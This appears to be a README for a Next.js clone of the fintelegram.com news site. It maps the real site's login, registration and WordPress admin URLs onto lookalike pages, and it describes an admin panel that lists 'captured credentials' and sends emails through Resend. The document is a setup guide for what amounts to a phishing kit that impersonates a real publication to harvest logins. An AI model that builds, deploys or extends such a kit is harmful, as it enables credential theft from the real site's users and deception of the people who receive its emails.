# FinTelegram Clone

A Next.js clone of [fintelegram.com](https://fintelegram.com/) with matching URL structure, admin panel, credential capture, and email sending.

## Stack

- **Next.js 16** (App Router)
- **Supabase** (PostgreSQL)
- **Resend** (transactional email)

## Setup

### 1. Install dependencies

```bash
npm install
```

### 2. Configure environment

Copy `.env.local.example` to `.env.local` and fill in your values.

### 3. Create database tables

Run the SQL in `supabase/schema.sql` in your Supabase SQL Editor.

### 4. Run the dev server

```bash
npm run dev
```

## URL map (matches fintelegram.com)

| Real site URL | Clone URL | Description |
|---|---|---|
| `/` | `/` | News homepage |
| `/front-page/` | `/front-page` | FinTelegram Financial Intelligence landing |
| `/pms-login/` | `/pms-login` | Member login |
| `/pms-register/` | `/pms-register` | Membership registration |
| `/wp-login.php` | `/wp-login.php` | WordPress admin login |
| `/wp-admin/` | `/wp-admin` | Admin panel (redirects to credentials) |
| `/wp-admin/credentials` | `/wp-admin/credentials` | Captured credentials |
| `/wp-admin/emails` | `/wp-admin/emails` | Send emails via Resend |

Legacy paths (`/login`, `/register`, `/wp-login`, `/admin/*`, `/home`) redirect to the URLs above.

## Admin

1. Go to `/wp-login.php`
2. Enter any username + your `ADMIN_PASSWORD`
3. Manage **Credentials** and **Emails** under `/wp-admin/`
